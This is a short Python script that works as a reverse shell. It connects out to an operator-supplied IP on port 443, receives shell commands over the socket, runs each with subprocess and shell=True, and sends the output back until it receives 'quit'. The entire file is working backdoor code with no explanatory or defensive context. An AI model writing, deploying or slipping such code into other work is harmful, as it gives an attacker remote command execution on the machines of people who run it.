#!/usr/bin/python
#Put your ip in the host

import subprocess,socket

HOST = ''
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.send('Hellow there!')

while 1:
    data = s.recv(1024)
    if data == "quit": break

    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    stdoutput = proc.stdout.read() + proc.stderr.read()

    s.send(stdoutput)

#exit the loop
s.send('byebye')
s.close()
